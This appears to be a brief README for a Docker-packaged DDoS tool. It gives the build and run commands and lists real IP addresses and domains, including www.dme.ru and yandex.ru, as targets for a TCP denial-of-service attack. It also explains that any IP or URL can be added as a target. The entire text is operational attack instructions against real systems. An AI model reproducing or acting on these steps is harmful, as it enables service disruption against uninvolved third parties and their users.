After successful downloading you need to install docker desktop.
https://www.docker.com/products/docker-desktop
Open MainApp folder in terminal and run two commands:
"docker build -t ddosimage . " and
"docker run -it --rm  ddosimage  3 80.68.247.26 www.dme.ru yandex.ru 195.218.193.151 77.51.53.74"

Last row after "ddosimage"  you can put all ip address on which you want to make TCP ddos attack or url
